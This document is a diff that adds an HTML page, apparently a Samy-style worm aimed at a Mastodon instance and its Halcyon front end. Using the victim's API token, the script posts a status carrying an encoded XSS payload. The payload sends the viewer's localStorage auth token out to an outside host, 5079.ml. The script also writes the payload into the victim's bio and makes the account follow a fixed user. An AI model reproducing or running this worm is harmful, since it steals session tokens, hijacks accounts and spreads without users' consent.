@@ -1,0 +1,32 @@
+<!doctype html>
+<h1>why did i do this</h1>
+<title>samy worm but it jack</title>
+<p>check your toots, bio, and following</p>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script src="mastodon.js"></script>
+<script>
+    // initialize library
+    // api_user_token has not to be set at this point if you don't have one yet
+    // NOTE: It needs jQuery!
+    var api = new MastodonAPI({
+        instance: "https://this-is-epic.space",
+        api_user_token: new URLSearchParams(location.search).get('code')
+    });
+  const status = 'jack funny #bigchunguspenis https://halcyon.this-is-epic.space/unshorten.php?url=%3Cscript%3Elocation%20%3D%20%60https%3A%2F%2F5079.ml%2Frandom%2Fsamy%3Fcode%3D%24%7BlocalStorage.current_authtoken%7D%60%3C%2Fscript%3E'
+    //
+    // BASIC REST FUNCTIONS
+    // you can use every api endpoint from https://github.com/tootsuite/documentation/blob/master/Using-the-API/API.md
+    //
+
+    api.post("statuses", {status}, function (data) {
+      console.log('done toot')
+    });
+    
+    api.get('accounts/verify_credentials', {}, (data)=>{
+    api.patch("accounts/update_credentials", {note: note+status}, function (data) {
+      console.log('done bio')
+    });
+    })
+    // self promo
+    api.post("accounts/18/follow", {}, ()=>console.log('done follow'))
+    </script>
